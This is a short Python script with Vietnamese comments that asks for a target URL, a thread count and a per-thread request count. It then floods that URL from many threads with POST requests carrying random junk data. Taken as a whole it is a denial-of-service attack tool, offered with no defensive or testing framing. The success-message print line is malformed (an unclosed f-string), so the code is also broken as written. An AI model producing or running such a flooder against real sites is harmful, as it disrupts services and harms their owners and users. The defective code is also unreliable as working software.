import os
import requests
import random
import threading

# Xóa màn hình terminal
os.chdir(os.path.dirname(os.path.realpath(__file__)))
os.system("cls" if os.name == "nt" else "clear")

# Nhập dữ liệu đầu vào
url = input("Nhập URL: ")
so_luong_luong = int(input("Số lượng luồng: "))
yeu_cau_moi_luong = int(input("Nhập số lượng yêu cầu trên mỗi luồng: "))

def gui_yeu_cau(ma_luong):
    for i in range(yeu_cau_moi_luong):
        try:
            du_lieu = random._urandom(10) * 1000
            phan_hoi = requests.post(url, data=du_lieu)
            # In ra trạng thái trên cùng một dòng
            print(f"\rLuồng {ma_luong} end='')
        except Exception as e:
            print(f"\rLuồng {ma_luong}: Lỗi - {e}", end='')

def main():
    cac_luong = []

    for i in range(so_luong_luong):
        luong = threading.Thread(target=gui_yeu_cau, args=(i + 1,))
        cac_luong.append(luong)
        luong.start()

    for luong in cac_luong:
        luong.join()

    # In thêm một dòng trống để đảm bảo không đè lên kết quả cuối cùng
    print()

if __name__ == "__main__":
    main()